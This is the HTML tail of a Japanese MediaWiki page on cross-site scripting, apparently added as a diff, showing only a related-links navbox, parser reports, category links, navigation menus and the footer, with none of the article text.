+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=OWASP&amp;action=edit&amp;redlink=1" title="OWASP (存在しないページ)">OWASP</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:OWASP&amp;action=edit&amp;redlink=1" title="En:OWASP (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=W3af&amp;action=edit&amp;redlink=1" title="W3af (存在しないページ)">w3af</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:w3af&amp;action=edit&amp;redlink=1" title="En:w3af (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E9%9A%A0%E3%82%8C%E9%80%9A%E4%BF%A1%E8%B7%AF&amp;action=edit&amp;redlink=1" title="隠れ通信路 (存在しないページ)">隠れ通信路</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Covert_channel&amp;action=edit&amp;redlink=1" title="En:Covert channel (存在しないページ)">英語版</a>）</span></span></li></ul>
+</div></td></tr></tbody></table></div>
+<!-- 
+NewPP limit report
+Cached time: 20220331072640
+Cache expiry: 86400
+Reduced expiry: false
+Complications: []
+CPU time usage: 0.346 seconds
+Real time usage: 0.584 seconds
+Preprocessor visited node count: 9433/1000000
+Post‐expand include size: 86168/2097152 bytes
+Template argument size: 23052/2097152 bytes
+Highest expansion depth: 34/40
+Expensive parser function count: 25/100
+Unstrip recursion depth: 0/20
+Unstrip post‐expand size: 18831/5000000 bytes
+Lua time usage: 0.240/7 seconds
+Lua virtual size: 7340032/52428800 bytes
+Lua estimated memory usage: 0 bytes
+-->
+<!--
+Transclusion expansion time report (%,ms,calls,template)
+100.00%  514.940      1 -total
+ 42.05%  216.531     53 テンプレート:Sfn
+ 16.09%   82.851      1 テンプレート:エクスプロイト
+ 15.61%   80.394      1 テンプレート:Navbox
+ 15.25%   78.530     26 テンプレート:仮リンク
+ 14.74%   75.883      7 テンプレート:Cite_web
+ 14.22%   73.199      2 テンプレート:Cite_book
+ 13.28%   68.409      2 テンプレート:Cite_book/和書
+  9.52%   49.030      2 テンプレート:ISBN2
+  7.32%   37.700      1 テンプレート:Reflist
+-->
+<!-- Saved in parser cache with key my_wiki:pcache:idhash:6757-0!canonical and timestamp 20220331072639 and revision id 5261. Serialized with JSON.
+ -->
+</div>
+<div class="printfooter">「<a dir="ltr" href="http://localhost:8080/w/index.php?title=クロスサイトスクリプティング&amp;oldid=5261">http://localhost:8080/w/index.php?title=クロスサイトスクリプティング&amp;oldid=5261</a>」から取得</div></div>
+<div class="catlinks" data-mw="interface" id="catlinks"><div class="mw-normal-catlinks" id="mw-normal-catlinks"><a href="/wiki/%E7%89%B9%E5%88%A5:%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA" title="特別:カテゴリ">カテゴリ</a>: <ul><li><a href="/wiki/%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA:%E5%A3%8A%E3%82%8C%E3%81%9F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%B8%E3%81%AE%E3%83%AA%E3%83%B3%E3%82%AF%E3%81%8C%E3%81%82%E3%82%8B%E3%83%9A%E3%83%BC%E3%82%B8" title="カテゴリ:壊れたファイルへのリンクがあるページ">壊れたファイルへのリンクがあるページ</a></li><li><a href="/wiki/%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA:%E6%9B%B8%E3%81%8D%E3%81%8B%E3%81%91%E3%81%AE%E7%AF%80%E3%81%AE%E3%81%82%E3%82%8B%E9%A0%85%E7%9B%AE" title="カテゴリ:書きかけの節のある項目">書きかけの節のある項目</a></li><li><a href="/wiki/%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA:%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E6%8A%80%E8%A1%93" title="カテゴリ:セキュリティ技術">セキュリティ技術</a></li><li><a href="/wiki/%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA:%E3%82%B3%E3%83%B3%E3%83%94%E3%83%A5%E3%83%BC%E3%82%BF%E3%83%BB%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%BB%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3" title="カテゴリ:コンピュータ・ネットワーク・セキュリティ">コンピュータ・ネットワーク・セキュリティ</a></li><li><a href="/wiki/%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA:%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88" title="カテゴリ:エクスプロイト">エクスプロイト</a></li></ul></div></div>
+</div>
+</div>
+<div id="mw-navigation">
+<h2>案内メニュー</h2>
+<div id="mw-head">
+<nav aria-labelledby="p-personal-label" class="mw-portlet mw-portlet-personal vector-user-menu-legacy vector-menu" id="p-personal" role="navigation">
+<h3 class="vector-menu-heading" id="p-personal-label"> <span>個人用ツール</span>
+</h3>
+<div class="vector-menu-content">
+<ul class="vector-menu-content-list"><li class="mw-list-item" id="pt-anonuserpage">ログインしていません</li><li class="mw-list-item" id="pt-anontalk"><a accesskey="n" href="/wiki/%E7%89%B9%E5%88%A5:%E3%83%88%E3%83%BC%E3%82%AF%E3%83%9A%E3%83%BC%E3%82%B8" title="このIPアドレスからなされた編集についての議論 [n]">トーク</a></li><li class="mw-list-item" id="pt-anoncontribs"><a accesskey="y" href="/wiki/%E7%89%B9%E5%88%A5:%E8%87%AA%E5%88%86%E3%81%AE%E6%8A%95%E7%A8%BF%E8%A8%98%E9%8C%B2" title="このIPアドレスからなされた編集の一覧 [y]">投稿記録</a></li><li class="mw-list-item" id="pt-createaccount"><a href="/w/index.php?title=%E7%89%B9%E5%88%A5:%E3%82%A2%E3%82%AB%E3%82%A6%E3%83%B3%E3%83%88%E4%BD%9C%E6%88%90&amp;returnto=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;returntoquery=curid%3D6757%26redirect%3Dno" title="アカウントを作成してログインすることをお勧めしますが、必須ではありません">アカウント作成</a></li><li class="mw-list-item" id="pt-login"><a accesskey="o" href="/w/index.php?title=%E7%89%B9%E5%88%A5:%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3&amp;returnto=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;returntoquery=curid%3D6757%26redirect%3Dno" title="ログインすることを推奨します。ただし、必須ではありません。 [o]">ログイン</a></li></ul>
+</div>
+</nav>
+<div id="left-navigation">
+<nav aria-labelledby="p-namespaces-label" class="mw-portlet mw-portlet-namespaces vector-menu vector-menu-tabs" id="p-namespaces" role="navigation">
+<h3 class="vector-menu-heading" id="p-namespaces-label"> <span>名前空間</span>
+</h3>
+<div class="vector-menu-content">
+<ul class="vector-menu-content-list"><li class="selected mw-list-item" id="ca-nstab-main"><a accesskey="c" href="/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0" title="本文を閲覧 [c]">ページ</a></li><li class="new mw-list-item" id="ca-talk"><a accesskey="t" href="/w/index.php?title=%E3%83%88%E3%83%BC%E3%82%AF:%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" rel="discussion" title="本文ページについての議論 (存在しないページ) [t]">ノート</a></li></ul>
+</div>
+</nav>
+<nav aria-labelledby="p-variants-label" class="mw-portlet mw-portlet-variants emptyPortlet vector-menu-dropdown-noicon vector-menu vector-menu-dropdown" id="p-variants" role="navigation">
+<input aria-haspopup="true" aria-labelledby="p-variants-label" class="vector-menu-checkbox" data-event-name="ui.dropdown-p-variants" id="p-variants-checkbox" role="button" type="checkbox"/>
+<h3 class="vector-menu-heading" id="p-variants-label"> <span>変種</span>
+<span class="vector-menu-checkbox-expanded">拡張</span>
+<span class="vector-menu-checkbox-collapsed">折り畳む</span>
+</h3>
+<div class="vector-menu-content">
+<ul class="vector-menu-content-list"></ul>
+</div>
+</nav>
+</div>
+<div id="right-navigation">
+<nav aria-labelledby="p-views-label" class="mw-portlet mw-portlet-views vector-menu vector-menu-tabs" id="p-views" role="navigation">
+<h3 class="vector-menu-heading" id="p-views-label"> <span>表示</span>
+</h3>
+<div class="vector-menu-content">
+<ul class="vector-menu-content-list"><li class="selected mw-list-item" id="ca-view"><a href="/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0">閲覧</a></li><li class="mw-list-item" id="ca-edit"><a accesskey="e" href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit" title="このページを編集 [e]">編集</a></li><li class="mw-list-item" id="ca-history"><a accesskey="h" href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=history" title="このページの過去の版 [h]">履歴表示</a></li></ul>
+</div>
+</nav>
+<nav aria-labelledby="p-cactions-label" class="mw-portlet mw-portlet-cactions emptyPortlet vector-menu-dropdown-noicon vector-menu vector-menu-dropdown" id="p-cactions" role="navigation" title="その他の操作">
+<input aria-haspopup="true" aria-labelledby="p-cactions-label" class="vector-menu-checkbox" data-event-name="ui.dropdown-p-cactions" id="p-cactions-checkbox" role="button" type="checkbox"/>
+<h3 class="vector-menu-heading" id="p-cactions-label"> <span>その他</span>
+<span class="vector-menu-checkbox-expanded">拡張</span>
+<span class="vector-menu-checkbox-collapsed">折り畳む</span>
+</h3>
+<div class="vector-menu-content">
+<ul class="vector-menu-content-list"></ul>
+</div>
+</nav>
+<div class="vector-search-box" id="p-search" role="search">
+<div>
+<h3>
+<label for="searchInput">検索</label>
+</h3>
+<form action="/w/index.php" id="searchform">
+<div data-search-loc="header-navigation" id="simpleSearch">
+<input accesskey="f" autocapitalize="sentences" id="searchInput" name="search" placeholder="Wikipedia内を検索" title="Wikipedia内を検索 [f]" type="search"/>
+<input name="title" type="hidden" value="特別:検索"/>
+<input class="searchButton mw-fallbackSearchButton" id="mw-searchButton" name="fulltext" title="この文字列が含まれるページを探す" type="submit" value="検索"/>
+<input class="searchButton" id="searchButton" name="go" title="厳密に一致する名前のページが存在すれば、そのページへ移動する" type="submit" value="表示"/>
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+<div id="mw-panel">
+<div id="p-logo" role="banner">
+<a class="mw-wiki-logo" href="/wiki/%E3%83%A1%E3%82%A4%E3%83%B3%E3%83%9A%E3%83%BC%E3%82%B8" title="メインページに移動する"></a>
+</div>
+<nav aria-labelledby="p-navigation-label" class="mw-portlet mw-portlet-navigation vector-menu vector-menu-portal portal" id="p-navigation" role="navigation">
+<h3 class="vector-menu-heading" id="p-navigation-label"> <span>案内</span>
+</h3>
+<div class="vector-menu-content">
+<ul class="vector-menu-content-list"><li class="mw-list-item" id="n-mainpage-description"><a accesskey="z" href="/wiki/%E3%83%A1%E3%82%A4%E3%83%B3%E3%83%9A%E3%83%BC%E3%82%B8" title="メインページに移動する [z]">メインページ</a></li><li class="mw-list-item" id="n-portal"><a href="/wiki/Wikipedia:%E3%82%B3%E3%83%9F%E3%83%A5%E3%83%8B%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9D%E3%83%BC%E3%82%BF%E3%83%AB" title="このプロジェクトについて、できること、情報を入手する場所">コミュニティ・ポータル</a></li><li class="mw-list-item" id="n-currentevents"><a href="/wiki/Portal:%E6%9C%80%E8%BF%91%E3%81%AE%E5%87%BA%E6%9D%A5%E4%BA%8B" title="最近の出来事の背景を知る">最近の出来事</a></li><li class="mw-list-item" id="n-newpages"><a href="/wiki/%E7%89%B9%E5%88%A5:%E6%96%B0%E3%81%97%E3%81%84%E3%83%9A%E3%83%BC%E3%82%B8" title="最近新規に作成されたページの一覧">新しいページ</a></li><li class="mw-list-item" id="n-recentchanges"><a accesskey="r" href="/wiki/%E7%89%B9%E5%88%A5:%E6%9C%80%E8%BF%91%E3%81%AE%E6%9B%B4%E6%96%B0" title="このウィキにおける最近の更新の一覧 [r]">最近の更新</a></li><li class="mw-list-item" id="n-randompage"><a accesskey="x" href="/wiki/%E7%89%B9%E5%88%A5:%E3%81%8A%E3%81%BE%E3%81%8B%E3%81%9B%E8%A1%A8%E7%A4%BA" title="無作為に選択されたページを読み込む [x]">おまかせ表示</a></li><li class="mw-list-item" id="n-sandbox"><a href="/wiki/Wikipedia:%E3%82%B5%E3%83%B3%E3%83%89%E3%83%9C%E3%83%83%E3%82%AF%E3%82%B9" title="練習用のページ">練習用ページ</a></li><li class="mw-list-item" id="n-commonsupload"><a href="//commons.wikimedia.org/wiki/Special:UploadWizard?uselang=ja" rel="nofollow" title="画像やメディアファイルをウィキメディア・コモンズにアップロード">アップロード (ウィキメディア・コモンズ)</a></li></ul>
+</div>
+</nav>
+<nav aria-labelledby="p-help-label" class="mw-portlet mw-portlet-help vector-menu vector-menu-portal portal" id="p-help" role="navigation">
+<h3 class="vector-menu-heading" id="p-help-label"> <span>ヘルプ</span>
+</h3>
+<div class="vector-menu-content">
+<ul class="vector-menu-content-list"><li class="mw-list-item" id="n-help"><a href="/wiki/%E3%83%98%E3%83%AB%E3%83%97:%E7%9B%AE%E6%AC%A1" title="情報を得る場所">ヘルプ</a></li><li class="mw-list-item" id="n-villagepump"><a href="/wiki/Wikipedia:%E4%BA%95%E6%88%B8%E7%AB%AF" title="プロジェクトについての意見交換">井戸端</a></li><li class="mw-list-item" id="n-notice"><a href="/wiki/Wikipedia:%E3%81%8A%E7%9F%A5%E3%82%89%E3%81%9B" title="プロジェクトについてのお知らせ">お知らせ</a></li><li class="mw-list-item" id="n-bugreportspage"><a href="/wiki/Wikipedia:%E3%83%90%E3%82%B0%E3%81%AE%E5%A0%B1%E5%91%8A" title="ウィキペディア・ソフトウェアのバグ報告">バグの報告</a></li><li class="mw-list-item" id="n-sitesupport"><a href="//donate.wikimedia.org/wiki/Special:FundraiserRedirector?utm_source=donate&amp;utm_medium=sidebar&amp;utm_campaign=C13_ja.wikipedia.org&amp;uselang=ja" rel="nofollow">sitesupport</a></li><li class="mw-list-item" id="n-contact"><a href="/wiki/Wikipedia:%E9%80%A3%E7%B5%A1%E5%85%88" title="ウィキペディアやウィキメディア財団に関する連絡先">ウィキペディアに関するお問い合わせ</a></li></ul>
+</div>
+</nav>
+<nav aria-labelledby="p-tb-label" class="mw-portlet mw-portlet-tb vector-menu vector-menu-portal portal" id="p-tb" role="navigation">
+<h3 class="vector-menu-heading" id="p-tb-label"> <span>ツール</span>
+</h3>
+<div class="vector-menu-content">
+<ul class="vector-menu-content-list"><li class="mw-list-item" id="t-whatlinkshere"><a accesskey="j" href="/wiki/%E7%89%B9%E5%88%A5:%E3%83%AA%E3%83%B3%E3%82%AF%E5%85%83/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0" title="ここにリンクしている全ウィキページの一覧 [j]">リンク元</a></li><li class="mw-list-item" id="t-recentchangeslinked"><a accesskey="k" href="/wiki/%E7%89%B9%E5%88%A5:%E9%96%A2%E9%80%A3%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%AE%E6%9B%B4%E6%96%B0%E7%8A%B6%E6%B3%81/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0" rel="nofollow" title="このページからリンクしているページの最近の更新 [k]">関連ページの更新状況</a></li><li class="mw-list-item" id="t-specialpages"><a accesskey="q" href="/wiki/%E7%89%B9%E5%88%A5:%E7%89%B9%E5%88%A5%E3%83%9A%E3%83%BC%E3%82%B8%E4%B8%80%E8%A6%A7" title="特別ページの一覧 [q]">特別ページ</a></li><li class="mw-list-item" id="t-print"><a accesskey="p" href="javascript:print();" rel="alternate" title="このページの印刷用ページ [p]">印刷用バージョン</a></li><li class="mw-list-item" id="t-permalink"><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;oldid=5261" title="このページのこの版への固定リンク">この版への固定リンク</a></li><li class="mw-list-item" id="t-info"><a href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=info" title="このページについての詳細情報">ページ情報</a></li></ul>
+</div>
+</nav>
+</div>
+</div>
+<footer class="mw-footer" id="footer" role="contentinfo">
+<ul id="footer-info">
+<li id="footer-info-lastmod"> 最終更新 2020年9月2日 (水) 22:11 （日時は<a href="/wiki/%E7%89%B9%E5%88%A5:%E5%80%8B%E4%BA%BA%E8%A8%AD%E5%AE%9A#mw-prefsection-rendering" title="特別:個人設定">個人設定</a>で未設定ならば<a href="/wiki/%E5%8D%94%E5%AE%9A%E4%B8%96%E7%95%8C%E6%99%82" title="協定世界時">UTC</a>）。</li>
+</ul>
+<ul id="footer-places">
+<li id="footer-places-privacy"><a href="/wiki/Wikipedia:%E3%83%97%E3%83%A9%E3%82%A4%E3%83%90%E3%82%B7%E3%83%BC%E3%83%BB%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC" title="Wikipedia:プライバシー・ポリシー">プライバシー・ポリシー</a></li>
+<li id="footer-places-about"><a href="/wiki/Wikipedia:%E3%82%A6%E3%82%A3%E3%82%AD%E3%83%9A%E3%83%87%E3%82%A3%E3%82%A2%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6" title="Wikipedia:ウィキペディアについて">ウィキペディアについて</a></li>
+<li id="footer-places-disclaimer"><a href="/wiki/Wikipedia:%E5%85%8D%E8%B2%AC%E4%BA%8B%E9%A0%85" title="Wikipedia:免責事項">免責事項</a></li>
+</ul>
+<ul class="noprint" id="footer-icons">
+<li id="footer-poweredbyico"><a href="https://www.mediawiki.org/"><img alt="Powered by MediaWiki" height="31" loading="lazy" src="/w/resources/assets/poweredby_mediawiki_88x31.png" srcset="/w/resources/assets/poweredby_mediawiki_132x47.png 1.5x, /w/resources/assets/poweredby_mediawiki_176x62.png 2x" width="88"/></a></li>
+</ul>
+</footer>
+<script>(RLQ=window.RLQ||[]).push(function(){mw.config.set({"wgPageParseReport":{"limitreport":{"cputime":"0.346","walltime":"0.584","ppvisitednodes":{"value":9433,"limit":1000000},"postexpandincludesize":{"value":86168,"limit":2097152},"templateargumentsize":{"value":23052,"limit":2097152},"expansiondepth":{"value":34,"limit":40},"expensivefunctioncount":{"value":25,"limit":100},"unstrip-depth":{"value":0,"limit":20},"unstrip-size":{"value":18831,"limit":5000000},"timingprofile":["100.00%  514.940      1 -total"," 42.05%  216.531     53 テンプレート:Sfn"," 16.09%   82.851      1 テンプレート:エクスプロイト"," 15.61%   80.394      1 テンプレート:Navbox"," 15.25%   78.530     26 テンプレート:仮リンク"," 14.74%   75.883      7 テンプレート:Cite_web"," 14.22%   73.199      2 テンプレート:Cite_book"," 13.28%   68.409      2 テンプレート:Cite_book/和書","  9.52%   49.030      2 テンプレート:ISBN2","  7.32%   37.700      1 テンプレート:Reflist"]},"scribunto":{"limitreport-timeusage":{"value":"0.240","limit":"7"},"limitreport-virtmemusage":{"value":7340032,"limit":52428800},"limitreport-estmemusage":0},"cachereport":{"timestamp":"20220331072640","ttl":86400,"transientcontent":false}}});mw.config.set({"wgBackendResponseTime":109});});</script>
+</body></html>
